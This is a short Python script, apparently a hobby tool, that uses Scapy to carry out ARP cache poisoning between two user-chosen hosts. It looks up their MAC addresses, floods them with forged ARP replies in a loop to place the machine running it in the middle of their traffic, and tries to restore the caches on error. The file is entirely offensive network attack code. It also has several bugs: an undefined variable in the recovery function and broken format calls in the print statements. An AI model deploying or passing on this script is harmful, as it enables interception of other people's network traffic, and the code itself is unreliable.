from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.l2 import ARP
import socket

def getMACaddress(ip_addr):
    broadcast = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    l3_request = ARP(pdst = ip_addr)
    arp_request = broadcast / l3_request
    arp_response = srp(arp_request, timeout = 20, verbose = False)
    return arp_response[0][0][1].hwsrc

def spoof(dst_ip, src_ip, dst_mac):
    spoof_packet = ARP(op = 2, pdst = dst_ip, psrc = src_ip, hwdst = dst_mac)
    send(spoof_packet, verbose = False)

def recover(dst_ip, dst_mac, src_ip, src_mac):
    recover_packet = ARP(op = 2, pdst = target_ip, psrc = src_ip, hwdst = dst_mac, hwsrc = src_mac)
    send(recover_packet, verbose = False)


alice = input('Target to spoof: ')
bob = input('hostname: ')
alice_ip = socket.gethostbyname(alice)#alice
bob_ip = socket.gethostbyname(bob)#bob
alice_mac = getMACaddress(alice_ip)
print('{alice} MAC address is {gateway_mac}'.format)
bob_mac = getMACaddress(bob_ip)
print('{bob} MAC address is {target_mac}'.format())

_ = input('enter any key to start ARP cache poisoning...')

try:
    while True:
        spoof(alice_ip, bob_ip, alice_mac)
        spoof(bob_ip, alice_ip, bob_mac)

except Exception:
    recover(alice_ip, alice_mac, bob_ip, bob_mac)
    recover(bob_ip, bob_mac, alice_ip, alice_mac)
    exit()
